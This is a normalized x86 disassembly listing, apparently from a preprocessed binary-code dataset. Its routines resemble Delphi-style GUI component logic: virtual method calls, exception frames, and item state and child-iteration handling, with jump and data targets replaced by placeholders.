call sub_44f6ac
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44db10
mov eax ebx
call sub_44f6ac
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_414108
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413ff8
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_44f960
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_44f584
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44f694
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_44f694
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_44fa28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f6ac
mov edx eax
mov ecx esi
mov eax ebx
call sub_44f838
pop esi
pop ebx
retn
sub_44fa44
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44fa10
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_44f8ec
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44cce8
sub_44fa6c
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_44fab0
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_44fab0
jmp r-xdata
mov eax ebx
call sub_44db10
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_451788
sub_44fb08
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebx + 0x4c ] eax
sub_44fb30
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403124
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44fdc4
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403320
mov edx ebx
mov eax edi
call sub_41ab4c
mov eax ebx
mov si 0xffee
call sub_403320
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_44fba0
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ esi + 0x4c ] eax
sub_44fbd4
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_44f6ac
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_44f6bc
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_44fc14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44fa44
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_44fa28
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44fa28
sub_44fc78
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_44f53c
sub_44fca4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_44f514
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_44f584
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_44f5d8
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403f4c
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_44f704
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_44f650
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_44f6e0
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_44f6f4
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44fdc4
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44f694
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403320
sub_44fde8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44fe08
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44fe28
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44fe48
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44fe68
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44fe88
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44fea8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44fec8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44fee8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44ff08
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414800
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_449d58
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_449e90
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_449ef0
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_449bf0
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_449fb0
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44ff80
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41ad98
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44f694
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_44fb30
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_44ffd4
jmp r-xdata
xor edx edx
mov eax esi
call sub_44da98
sub_44ffd4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_44b46c
mov eax ebx
call sub_450044
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_44b4b0
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_41ab4c
sub_45001c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45001c
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44d16c
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_44fab0
mov eax ebx
pop esi
pop ebx
retn
sub_450058
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c384
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404458
sub_450088
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_403f90
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_45010c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45022e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_4041b8
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_4041b8
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404418
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404304
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450235
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f1c
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4044a0
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_404278
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_4041b8
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404418
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_404278
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_45026c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_45070b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403f90
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4506cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_44f6ac
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_403f90
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450712
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403f1c
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403f1c
lea eax [ ebp - 0x18 ]
call sub_403ef8
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax ebx
call sub_4508c0
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_44f6bc
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404304
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_450088
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44f6bc
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44f6bc
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403124
mov eax [ ebp - 0x20 ]
call sub_403124
mov eax [ ebp - 0x14 ]
call sub_403124
mov eax [ ebp - 0xc ]
call sub_403124
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_450088
pop ecx
mov eax [ ebp - 0x30 ]
call sub_4041b8
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_44f6bc
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_452164
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407b44
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403f4c
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c384
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c384
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44f6bc
push eax
mov edx esi
mov eax ebx
call sub_44f6bc
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404418
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407b44
push ebp
mov eax [ ebp - 0x2c ]
call sub_450058
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_450058
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c384
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_403f90
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44f6bc
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_44f6bc
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_4520d0
mov edx [ ebp - 0x40 ]
pop eax
call sub_403f4c
mov edx esi
mov eax ebx
call sub_44f6bc
push eax
mov edx esi
mov eax ebx
call sub_44f6bc
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4041b8
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404418
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_45010c
mov eax [ ebp - 0x18 ]
call sub_4041b8
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404458
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_4044a0
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_45010c
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_450768
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_44f6ac
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_44f6ac
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4508ec
test al al
je r-xdata
mov eax esi
call sub_44f6ac
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_44f6bc
call sub_450744
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_44f6bc
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_44f6bc
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44f6bc
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_44f6bc
call sub_450744
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_44f6bc
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44f6bc
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44f6bc
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_44f6bc
call sub_450744
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_4508c0
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_4508c0
and eax 0x7f
mov al [ eax + rw-data ]
sub_4508ec
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_4508ec
and eax 0x7f
mov al [ eax + rw-data ]
sub_450918
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44d600
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_41aa7c
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_451644
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4509b4
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403124
mov eax [ esi + 0x44 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aac8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_450a28
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_450a28
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44d16c
push 0x1
mov ecx esi
mov edx esi
